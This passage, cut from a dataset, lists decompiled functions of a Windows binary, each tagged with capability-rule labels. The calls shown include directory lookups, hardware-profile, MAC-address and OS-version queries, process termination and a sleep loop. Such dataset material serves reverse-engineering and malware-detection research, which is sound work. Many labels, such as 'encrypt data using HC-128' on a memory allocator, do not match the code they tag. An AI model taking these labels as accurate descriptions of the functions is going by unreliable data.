0;\n            puStack6676 = &fcn.00489580::var_14h;\n            puStack6680 = NULL;\n            uStack6684 = 0;\n            uStack6688 = 0;\n            uStack6692 = var_8h;\n            uStack6696 = 0x4896f7;\n            sub.kernel32.dll_PeekNamedPipe();\n            uVar1 = uStack6692;\n            uStack6692 = var_8h;\n            while (var_8h = uStack6692,  var_14h != 0) {\n                uStack6696 = 0;\n                puStack6700 = &fcn.00489580::var_14h;\n                uStack6704 = 0x2400;\n                puStack6708 = &stack0xffffda84;\n                puStack6716 = 0x48971c;\n                iVar3 = sub.kernel32.dll_ReadFile_1();\n                uVar1 = uStack6692;\n                if (iVar3 == 0) break;\n                puStack6716 = &stack0xffffb684;\n                puStack6720 = &stack0xffffda84;\n                uStack6724 = 0x489733;\n                func_0x00408380();\n                puStack6668 = &stack0xffffb664;\n                uStack6672 = 0x489750;\n                fcn.004057a0();\n                uStack6672 = 0x489763;\n                fcn.00405a44();\n                uStack6672 = 0x489771;\n                fcn.00405818();\n                uStack6672 = 0;\n                puStack6676 = &fcn.00489580::var_14h;\n                puStack6680 = NULL;\n                uStack6684 = 0;\n                uStack6688 = 0;\n                uStack6692 = var_8h;\n                uStack6696 = 0x489786;\n                sub.kernel32.dll_PeekNamedPipe();\n                uVar1 = uStack6692;\n                uStack6692 = var_8h;\n            }\n            uStack6692 = uVar1;\n            var_20h = var_4h;\n            if (var_4h != 0) {\n                var_20h = *(var_4h + -4);\n            }\n            if (0 < var_20h) {\n                uStack6696 = 0x4897bb;\n                iVar3 = fcn.0041fa34();\n                *(iVar3 + 0xf) = 1;\n                uStack6696 = 0x4897ca;\n                fcn.0041fc40();\n                uStack6696 = 0x4897d4;\n                fcn.004894c0();\n                uStack6696 = 0x4897de;\n                fcn.00489470();\n                uStack6696 = 0x4897e8;\n                fcn.004894bc();\n                uStack6696 = 0x4897ef;\n                fcn.0041fef0();\n                uStack6696 = 0x4897f6;\n                fcn.0041ff20();\n            }\n        }\n    }\n    *(iVar2 + 0x48) = 0;\n    uStack6672 = 0;\n    puStack6676 = var_74h;\n    puStack6680 = 0x48980f;\n    sub.kernel32.dll_TerminateProcess();\n    puStack6680 = var_74h;\n    uStack6684 = 0x489818;\n    sub.kernel32.dll_CloseHandle_1();\n    uStack6684 = var_70h;\n    uStack6688 = 0x489821;\n    sub.kernel32.dll_CloseHandle_1();\n    uStack6688 = 0x489828;\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack6684;\n    puStack6676 = 0x489855;\n    puStack6680 = 0x489845;\n    fcn.00405554();\n    puStack6680 = 0x48984d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 2346
    },
    "00489864": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00489864(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    puStack24 = 0x489879;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack28 = 0x4898de;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x48) != '\\0') {\n        iVar2 = var_4h;\n        if (var_4h != 0) {\n            iVar2 = *(var_4h + -4);\n        }\n        puStack24 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(iVar2, &fcn.00489864::lpNumberOfBytesWritten, 0);\n        sub.kernel32.dll_WriteFile_1(*(in_EAX + 0x40), uVar1);\n        in_stack_ffffffb8 = *(in_EAX + 0x40);\n        sub.kernel32.dll_WriteFile_1(in_stack_ffffffb8, 0x4898f4, 2, &fcn.00489864::lpNumberOfBytesWritten, 0);\n    }\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405530(0x4898e5);\n    return;\n}\n",
        "token_count": 382
    },
    "00489a38": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00489a38(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    puStack44 = 0x489a52;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack44 = 0x489a5a;\n    fcn.004059cc();\n    uStack48 = 0x489ae8;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if (var_4h != 0) {\n        var_4h = *(var_4h + -4);\n    }\n    var_ch = var_4h >> 0x1f;\n    arg_8h = &fcn.00489a38::var_1ch;\n    puStack44 = &stack0xfffffffc;\n    var_10h = var_4h;\n    fcn.0040ef44(arg_8h, *0x489af8);\n    var_18h = var_1ch;\n    if (var_1ch != 0) {\n        var_18h = *(var_1ch + -4);\n    }\n    var_14h = var_18h >> 0x1f;\n    *in_FS_OFFSET = arg_8h;\n    iStack52 = 0x489aef;\n    fcn.00405530();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 444
    },
    "00489afc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00489afc(uint param_1, uint param_2)\n\n{\n    fcn.0040a54c();\n    fcn.00405a44(param_2);\n    return;\n}\n",
        "token_count": 47
    },
    "00489bb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489bb0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x489c5f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x489c66);\n    return;\n}\n",
        "token_count": 325
    },
    "00489c78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489c78(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x489d27;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x489d2e);\n    return;\n}\n",
        "token_count": 324
    },
    "00489d40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489d40(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x489def;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x489df6);\n    return;\n}\n",
        "token_count": 322
    },
    "00489e9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00489f12)\n// WARNING: Removing unreachable block (ram,0x00489f24)\n\nvoid fcn.00489e9c(void)\n\n{\n    char in_AL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x489fad;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x489f88;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004216c4();\n    fcn.004217a0();\n    fcn.004218e4();\n    if (in_AL != '\\0') {\n        fcn.00409b7c();\n    }\n    fcn.00422068();\n    fcn.00405584();\n    fcn.00422008();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x489f8f;\n    uStack44 = 0x489f7a;\n    fcn.00404650();\n    uStack44 = 2;\n    uStack48 = 0;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0);\n    return;\n}\n",
        "token_count": 366
    },
    "0048adcc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048adcc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x48ae8c;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040aaa8();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.00405530(0x48ae93);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 286
    },
    "0048b724": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048b724(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack192;\n    uint uStack188;\n    uchar *puStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint lpHwProfileInfo;\n    uint var_83h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack172 = &stack0xfffffffc;\n    puStack184 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack176 = 0x48b8ba;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack180;\n    uStack188 = 0x48b878;\n    iStack192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack192;\n    iVar1 = sub.advapi32.dll_GetCurrentHwProfileA(&lpHwProfileInfo);\n    if (iVar1 == 0) {\n        fcn.00489bb0();\n        fcn.0040a5d4();\n        fcn.00405818();\n        fcn.0048c91c();\n        iVar2 = 0x48b8e8;\n        iVar1 = var_8h;\n        fcn.004058e0(0x48b8e8, var_8h, 0x48b8dc);\n        *in_FS_OFFSET = iVar2;\n    }\n    else {\n        fcn.004057a0();\n        fcn.00405a44(&var_4h);\n        fcn.00489bb0();\n        fcn.0040a5d4();\n        fcn.00405818();\n        fcn.0048c91c();\n        iVar2 = 0x48b8e8;\n        iVar1 = var_4h;\n        fcn.004058e0(0x48b8e8, var_8h, 0x48b8f4);\n        *in_FS_OFFSET = iVar2;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405554(0x48b8c1);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 549
    },
    "0048d3c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048d518)\n\nvoid fcn.0048d3c4(void)\n\n{\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    uchar *puStack176;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    \n    puStack176 = &stack0xfffffffc;\n    uStack180 = 0x48d59b;\n    uStack184 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack184;\n    fcn.00405584();\n    lpVersionInformation = 0x94;\n    sub.kernel32.dll_GetVersionExA(&lpVersionInformation);\n    if (var_84h == 1) {\n        if (var_8ch == 0) {\n            fcn.00405584();\n        }\n        else if (var_8ch == 10) {\n            fcn.00405584();\n        }\n        else if (var_8ch == 0x5a) {\n            fcn.00405584();\n        }\n    }\n    else if (var_84h == 2) {\n        if (var_90h == 4) {\n            fcn.00405584();\n        }\n        else if (var_90h == 5) {\n            if (var_8ch == 0) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 1) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 2) {\n                fcn.00405584();\n            }\n        }\n        else if (var_90h == 6) {\n            if (var_8ch == 0) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 1) {\n                fcn.00405584();\n            }\n        }\n    }\n    fcn.004057a0();\n    if (var_88h != 0) {\n        uVar3 = *in_EAX;\n        uVar2 = 0x48d694;\n        uVar1 = 0;\n        fcn.00409e5c(var_88h);\n        fcn.004058e0(0x48d6a0, 0, var_88h, uVar1, uVar2, uVar3);\n    }\n    *in_FS_OFFSET = uStack200;\n    fcn.00405554(0x48d5a2);\n    return;\n}\n",
        "token_count": 634
    },
    "0048da48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048da48(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_fffffcf8;\n    int32_t iStack764;\n    uint uStack760;\n    uchar *puStack756;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b2h;\n    uint var_48h;\n    int32_t var_44h;\n    ushort var_40h;\n    uint var_3eh;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack756 = 0x48da65;\n    fcn.004059cc();\n    uStack760 = 0x48dbd6;\n    iStack764 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd04;\n    puStack756 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_48h._0_1_ = 0x32;\n    sub.netapi32.dll_Netbios(&fcn.0048da48::var_48h);\n    fcn.00403af4();\n    fcn.00403af4();\n    fcn.00405a3c();\n    fcn.004030fc();\n    var_48h._0_1_ = 0x33;\n    var_18h._0_1_ = 0;\n    var_40h = 0x26a;\n    iVar1 = fcn.00402f00();\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else {\n        var_44h = iVar1;\n        sub.netapi32.dll_Netbios(&fcn.0048da48::var_48h);\n        fcn.004030fc();\n        in_stack_fffffcf8 = &fcn.0048da48::var_8h;\n        fcn.0040af98(in_stack_fffffcf8);\n        fcn.00402f1c();\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = in_stack_fffffcf8;\n    fcn.00405554(0x48dbdd);\n    return;\n}\n",
        "token_count": 601
    },
    "0048e29c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048e29c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack24 = 0x48e322;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.0040a68c();\n    fcn.00405a44(&var_4h);\n    do {\n        sub.kernel32.dll_Sleep_2();\n        fcn.004735e8();\n        fcn.0048e06c();\n    } while( true );\n}\n",
        "token_count": 170
    },
    "004015ec": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004015ec(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t **in_EAX;\n    uint32_t uVar5;\n    \n    piVar2 = in_EAX[1];\n    piVar3 = *in_EAX;\n    *piVar2 = piVar3;\n    piVar3[1] = piVar2;\n    if (piVar2 == piVar3) {\n        uVar5 = piVar2 + -0x1255ea >> 8 & 0xff;\n        uVar4 = piVar2 + -0x1255ea >> 3 & 0x1f;\n        puVar1 = uVar5 * 4 + 0x495728;\n        *puVar1 = *puVar1 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n        if (*puVar1 == 0) {\n            uVar4 = uVar5 & 0x1f;\n            *0x495724 = *0x495724 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "0040162c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040162c(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = param_2 - 0xb30U >> 8;\n    iVar4 = (uVar3 - 0x3ff & -(uVar3 < 0x3ff)) + 0x3ff;\n    uVar3 = iVar4 * 8;\n    ppiVar2 = *(uVar3 + 0x4957ac);\n    *in_EAX = uVar3 + 0x4957a8;\n    in_EAX[1] = ppiVar2;\n    *ppiVar2 = in_EAX;\n    *(uVar3 + 0x4957ac) = in_EAX;\n    if (ppiVar2 != uVar3 + 0x4957a8) {\n        return;\n    }\n    uVar3 = uVar3 >> 8 & 0xff;\n    puVar1 = uVar3 * 4 + 0x495728;\n    *puVar1 = *puVar1 | 1 << (iVar4 & 0x1f);\n    *0x495724 = *0x495724 | 1 << (uVar3 & 0x1f);\n    return;\n}\n",
        "token_count": 320
    },
    "00401a0c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint8_t ** fcn.00401a0c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    uint8_t *in_EAX;\n    uint8_t **ppuVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    \n    if (0xa2c < in_EAX) {\n        if (0x40a2c < in_EAX) {\n            if (in_EAX < 0) {\n                return NULL;\n            }\n            ppuVar10 = sub.kernel32.dll_VirtualAlloc(0, in_EAX + 0x10013 & 0xffff0000, 0x101000, 4);\n            if (ppuVar10 != NULL) {\n                ppuVar10[2] = in_EAX;\n                ppuVar10[3] = in_EAX + 0x10013 & 0xffff0000 | 4;\n                fcn.00401770();\n                ppuVar8 = *0x4977b0;\n                *ppuVar10 = 0x4977ac;\n                ppuVar9 = ppuVar10;\n                ppuVar10[1] = *0x4977b0;\n                *0x4977b0 = ppuVar9;\n                *ppuVar8 = ppuVar10;\n                *0x4977a8 = 0;\n                ppuVar10 = ppuVar10 + 4;\n            }\n            return ppuVar10;\n        }\n        uVar17 = in_EAX + 0xd3 & 0xffffff00;\n        uVar18 = uVar17 + 0x30;\n        if (*0x49504d != '\\0') {\n            while( true ) {\n                LOCK();\n                bVar19 = *0x495718 == 0;\n                *0x495718 = *0x495718 ^ bVar19 * (*0x495718 ^ 1);\n                if (bVar19) break;\n                if (*0x4955b5 == '\\0') {\n                    sub.kernel32.dll_Sleep();\n                    LOCK();\n                    bVar19 = *0x495718 == 0;\n                    *0x495718 = *0x495718 ^ bVar19 * (*0x495718 ^ 1);\n                    if (bVar19) break;\n                    sub.kernel32.dll_Sleep();\n                }\n            }\n        }\n        uVar15 = uVar17 - 0xb00;\n        uVar14 = uVar15 >> 0xd;\n        uVar11 = -1 << (uVar15 >> 8 & 0x1f) & *(uVar14 * 4 + 0x495728);\n        if (uVar11 == 0) {\n            uVar15 = -2 << (uVar14 & 0x1f) & *0x495724;\n            if (uVar15 == 0) {\n                if (*0x495720 < uVar18) {\n                    ppuVar10 = fcn.004016f8();\n                }\n                else {\n                    ppuVar10 = *0x49571c - uVar18;\n                    *0x49571c = ppuVar10;\n                    *0x495720 = *0x495720 - uVar18;\n                    ppuVar10[-1] = uVar18 | 2;\n                }\n                *0x495718 = 0;\n                return ppuVar10;\n            }\n            uVar14 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar14 & 1) == 0; uVar14 = uVar14 + 1) {\n                }\n            }\n            uVar15 = *(uVar14 * 4 + 0x495728);\n            uVar12 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar12 | uVar14 << 5;\n        }\n        else {\n            uVar12 = 0;\n            if (uVar11 != 0) {\n                for (; (uVar11 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar15 >> 8 & 0xffffffe0 | uVar12;\n        }\n        iVar13 = uVar12 * 8;\n        ppuVar10 = *(iVar13 + 0x4957ac);\n        piVar1 = ppuVar10[1];\n        *(iVar13 + 0x4957ac) = piVar1;\n        *piVar1 = iVar13 + 0x4957a8;\n        if (iVar13 + 0x4957a8 == piVar1) {\n            uVar7 = uVar12 & 0x1f;\n            puVar4 = uVar14 * 4 + 0x495728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar14 >> 3) + 0x495724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar14 & 7));\n            }\n        }\n        uVar15 = (ppuVar10[-1] & 0xfffffff0) - uVar18;\n        if (uVar15 == 0) {\n            puVar3 = ((ppuVar10[-1] & 0xfffffff0) - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            *(ppuVar10 + uVar17 + 0x2c) = uVar15 + 3;\n            *(ppuVar10 + (uVar15 - 8) + uVar18) = uVar15;\n            if (0xb2f < uVar15) {\n                fcn.0040162c();\n            }\n        }\n        ppuVar10[-1] = uVar17 + 0x32;\n        *0x495718 = 0;\n        return ppuVar10;\n    }\n    iVar13 = *((in_EAX + 3 >> 3) + 0x4955c0) * 8;\n    puVar3 = iVar13 + 0x49104c;\n    puVar16 = puVar3;\n    if (*0x49504d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x49106c;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x49108c;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            if (*0x4955b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                LOCK();\n                uVar7 = *puVar3;\n                *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n                puVar16 = puVar3;\n                if (uVar7 == 0) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    puVar3 = *(puVar16 + 4);\n    ppuVar10 = *(puVar3 + 8);\n    if (puVar3 != puVar16) {\n        *(puVar3 + 0xc) = *(puVar3 + 0xc) + 1;\n        puVar6 = ppuVar10[-1];\n        *(puVar3 + 8) = puVar6 & 0xfffffff8;\n        ppuVar10[-1] = puVar3;\n        if ((puVar6 & 0xfffffff8) != 0) {\n            *puVar16 = 0;\n            return ppuVar10;\n        }\n        iVar13 = *(puVar3 + 4);\n        *(iVar13 + 0x14) = puVar16;\n        *(puVar16 + 4) = iVar13;\n        *puVar16 = 0;\n        return ppuVar10;\n    }\n    puVar3 = *(puVar16 + 0x10);\n    uVar5 = *(puVar16 + 2);\n    if (ppuVar10 < *(puVar16 + 0xc) || ppuVar10 == *(puVar16 + 0xc)) {\n        piVar1 = puVar3 + 0xc;\n        *piVar1 = *piVar1 + 1;\n        *(puVar16 + 8) = uVar5 + ppuVar10;\n        *puVar16 = 0;\n        ppuVar10[-1] = puVar3;\n        return ppuVar10;\n    }\n    if (*0x49504d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar19 = *0x495718 == 0;\n            *0x495718 = *0x495718 ^ bVar19 * (*0x495718 ^ 1);\n            if (bVar19) break;\n            if (*0x4955b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar19 = *0x495718 == 0;\n                *0x495718 = *0x495718 ^ bVar19 * (*0x495718 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    uVar17 = puVar16[1] & *0x495724;\n    if (uVar17 == 0) {\n        if (*0x495720 < *(puVar16 + 0x18)) {\n            uVar17 = *(puVar16 + 0x1a);\n            ppuVar10 = fcn.004016f8();\n            if (ppuVar10 == NULL) {\n                *0x495718 = 0;\n                *puVar16 = 0;\n                return NULL;\n            }\n        }\n        else {\n            uVar17 = *0x495720;\n            if (*(puVar16 + 0x1a) + 0xb30 <= *0x495720) {\n                uVar17 = *(puVar16 + 0x1a);\n            }\n            ppuVar10 = *0x49571c - uVar17;\n            *0x495720 = *0x495720 - uVar17;\n            *0x49571c = ppuVar10;\n        }\n    }\n    else {\n        uVar18 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> uVar18 & 1) == 0; uVar18 = uVar18 + 1) {\n            }\n        }\n        uVar17 = *(uVar18 * 4 + 0x495728);\n        iVar13 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> iVar13 & 1) == 0; iVar13 = iVar13 + 1) {\n            }\n        }\n        iVar13 = iVar13 + uVar18 * 0x20;\n        iVar2 = iVar13 * 8;\n        ppuVar10 = *(iVar2 + 0x4957ac);\n        piVar1 = ppuVar10[1];\n        *(iVar2 + 0x4957ac) = piVar1;\n        *piVar1 = iVar2 + 0x4957a8;\n        if (iVar2 + 0x4957a8 == piVar1) {\n            uVar7 = iVar13 & 0x1f;\n            puVar4 = uVar18 * 4 + 0x495728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar18 >> 3) + 0x495724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar18 & 7));\n            }\n        }\n        uVar17 = ppuVar10[-1] & 0xfffffff0;\n        if (uVar17 < 0x10a60) {\n            puVar3 = (uVar17 - 4) + ppuVar10;\n            